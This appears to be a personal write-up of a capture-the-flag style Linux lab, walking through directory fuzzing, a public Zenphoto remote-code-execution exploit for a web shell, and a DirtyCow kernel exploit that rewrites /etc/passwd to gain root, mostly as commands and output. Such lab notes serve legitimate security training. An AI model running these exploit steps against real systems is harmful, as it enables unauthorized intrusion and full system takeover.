

## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time: 15 minutes
- Privesc time: 45 minutes
- Total solve time: 1 hour

## Summary
- Initial access: Reverse Shell via `Zenphoto` 
- Privilege escalation: Dirty Cow

## Enumeration
- Key findings: Found `Zenphoto` was hosted on port 80 

```
$ ffuf -u http://192.168.64.41/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.64.41/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 1ms]
test                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 383ms]
server-status           [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 5007ms]
index                   [Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 8ms]
:: Progress: [62281/62281] :: Job [1/1] :: 1058 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```
## Foothold
- Path: Web RCE
- Key commands: `exploit.php TARGET_HOST \test\`
![[Pasted image 20260401030809.png]]
- search online and found exploit for `Zenphoto` https://www.exploit-db.com/exploits/18083
- download the POC and run
```
$ php exploit.php 192.168.64.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
## Privilege Escalation
- Path: Vulnerable Kernel Version
- Key commands: `./dirty`

##### Steps
- load and run `linpeas.sh`, found that host has `gcc` and vulnerable to `dirtycow` and `rds`
```
OS: Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```
- download the exploit `https://www.exploit-db.com/download/40839` to target
- use `gcc` to compile the exploit
```
www-data@offsecsrv:/tmp$ gcc -pthread dirty.c -lcrypt -o dirty
www-data@offsecsrv:/tmp$ ls
dirty  dirty.c  dirty_cow2.c  f  linpeas.sh  passwd.bak  rd.c  vmware-root
```
- run the exploit and a new user is added as `sudoer` 
```
www-data@offsecsrv:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash

mmap: b7712000
www-data@offsecsrv:/tmp$ cat /etc/passwd
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
<SNIP>
www-data@offsecsrv:/tmp$ su firefart
Password:
firefart@offsecsrv:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```
## Lessons Learned
- Attack family: Web App, Linux Privilege Escalation
- Key takeaway: 

## Resources
- References: